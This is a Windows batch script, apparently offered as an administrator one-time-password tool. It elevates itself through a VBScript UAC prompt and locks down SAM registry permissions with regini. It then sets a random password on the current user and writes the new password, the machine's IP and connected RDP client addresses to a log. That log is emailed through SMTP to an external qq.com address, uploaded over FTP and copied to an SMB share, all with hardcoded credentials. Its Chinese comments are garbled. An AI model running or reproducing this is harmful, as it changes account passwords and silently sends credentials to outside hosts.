@echo off
REM Windowsʵ��һ���������¼������(OTP)���޸��������&��ֹ����û�&��ֹ�޸�����&�����ʼ�
@pushd "%temp%"
@echo.>%systemroot%\testfile.tmp
@if exist %systemroot%\testfile.tmp goto StartWithAdmin
@echo Set UAC = CreateObject^("Shell.Application"^)>getadm.vbs
@echo UAC.ShellExecute "%~0", "%*", "", "runas", 1 >>getadm.vbs
@getadm.vbs
@goto :eof
:StartWithAdmin
@del %systemroot%\testfile.tmp
@if exist getadm.vbs del getadm.vbs
@pushd "%~dp0"
Title A Modified Random Password
::This batch will be the administrator password to modify 13bit random complex password��
color 0A

del /s /q %tmp%\reg.ini>nul 2>nul
echo HKLM\SAM [1 17]>%tmp%\reg.ini
echo HKLM\SAM\SAM [1 17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains [1 17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account [1 17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Users [1 17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Groups [1 17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Users\Names [1 17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Users\000001F4 [1 17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Users\000001F5 [1 17]>>%tmp%\reg.ini
regini %tmp%\reg.ini>nul 2>nul

del /s /q o>nul 2>nul&del /s /q *.npd>nul 2>nul
for /f "tokens=2 delims=\" %%i in ('whoami') do set curuser=%%i
for /f "tokens=3 delims=: " %%i in ('net user %curuser% /random:13') do set newpassword=%%i>nul

echo HKLM\SAM [17]>%tmp%\reg.ini
echo HKLM\SAM\SAM [17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains [17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account [17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Users [17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Groups [19]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Groups\00000201 [19]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Users\Names [17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Users\000001F4 [17]>>%tmp%\reg.ini
echo HKLM\SAM\SAM\Domains\Account\Users\000001F5 [17]>>%tmp%\reg.ini
regini %tmp%\reg.ini>nul 2>nul

for /f "tokens=15" %%i in ('ipconfig /all ^| find /i "IP Address"') do set ip3=%%i
for /f "tokens=16 delims=( " %%i in ('ipconfig /all ^| find /i "IPv4"') do set ip=%%i
echo.>>%ip%%ip3%NPLog.npd
echo ��½���ڣ�%date:~0,10% %time:~0,-3%>>%ip%%ip3%NPLog.npd
echo ����I P��%ip%%ip3%>%ip%%ip3%NPLog.npd
echo �û�����%curuser%>>%ip%%ip3%NPLog.npd
echo �����룺%newpassword%>>%ip%%ip3%NPLog.npd

echo �ͻ���IP��>>%ip%%ip3%NPLog.npd
for /f "tokens=4 delims=: " %%i in ('netstat -n^|find ":3389"') do echo %%i>>%ip%%ip3%NPLog.npd


copy %ip%%ip3%NPLog.npd %tmp%\NPD.txt>nul 2>nul
ECHO NameSpace = "http://schemas.microsoft.com/cdo/configuration/" >sm.vbs
ECHO Set Email = CreateObject("CDO.Message") >>sm.vbs
ECHO Email.From = "mailaccount@163.com" >>sm.vbs
ECHO Email.To = "hdlbrjho@qq.com" >>sm.vbs
ECHO Email.Subject = "noreply��%ip%%ip3%�������������֪ͨ������" >>sm.vbs
ECHO Email.Textbody = "This message is sent automatically,�����������������ظ����ʼ�!" >>sm.vbs
ECHO Email.AddAttachment "%tmp%\NPD.txt" >>sm.vbs
ECHO With Email.Configuration.Fields >>sm.vbs
ECHO .Item(NameSpace^&"sendusing") = 2 >>sm.vbs
ECHO .Item(NameSpace^&"smtpserver") = "smtp.163.com" >>sm.vbs
ECHO .Item(NameSpace^&"smtpserverport") =25 >>sm.vbs
ECHO .Item(NameSpace^&"smtpauthenticate") = 1 >>sm.vbs
ECHO .Item(NameSpace^&"sendusername") = "mailaccount@163.com"  >>sm.vbs
ECHO .Item(NameSpace^&"sendpassword") = "mailpassword" >>sm.vbs
ECHO .Update >>sm.vbs
ECHO End With >>sm.vbs
ECHO Email.Send >>sm.vbs

wscript sm.vbs&&del /s /q sm.vbs>nul&&del /s /q %tmp%\%ip%%ip3%NPLog.npd>nul 2>nul

REM �������ݣ���ֹ�����ʼ�ʧ��
echo open 192.168.1.104>o&echo admin>>o&echo admin>>o&echo put *.npd>>o&echo quit>>o&ftp -s:o 2>nul&del /s /q o>nul 2>nul
net use * /delete /y&net use \\192.168.1.25\temp "sfdw124561" /user:"4651wer"&&copy %ip%%ip3%NPLog.npd \\192.168.1.25\temp\ 2>nul&del /s /q *.npd>nul 2>nul